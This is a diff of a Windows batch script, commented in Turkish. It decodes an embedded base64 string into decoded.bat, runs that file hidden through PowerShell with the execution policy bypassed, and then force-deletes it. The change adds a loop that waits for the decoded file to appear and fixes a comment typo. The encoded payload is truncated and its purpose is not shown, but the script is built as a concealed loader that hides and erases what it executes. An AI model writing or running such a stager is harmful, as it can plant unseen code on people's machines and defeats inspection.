@@ -5,10 +5,26 @@ set "base64String=QGVjaG8gb2ZmCnNldGxvY2FsIEVuYWJsZURlbGF5ZWRFeHBhbnNpb24KCjo6IE
 :: decoded.bat oluştur
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%base64String%')) | Set-Content -Encoding UTF8 decoded.bat"
 
-:: decoded.bat dosyasını gizli şekilde çalıştır ve bitmesini bekle
+:: decoded.bat dosyasının oluşmasını bekle (en fazla 10 saniye)
+set "trycount=0"
+:waitloop
+if exist "decoded.bat" (
+    goto runit
+)
+set /a trycount+=1
+if %trycount% GEQ 20 (
+    echo decoded.bat olusamadi.
+    exit /b
+)
+timeout /t 0.5 >nul
+goto waitloop
+
+:runit
+:: gizli çalıştır ve bitmesini bekle
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "Start-Process -FilePath 'decoded.bat' -WindowStyle Hidden -Wait"
 
-:: çalıştıktan sonra sill
+:: çalıştıktan sonra sil
 del /f /q decoded.bat
 
 exit
+
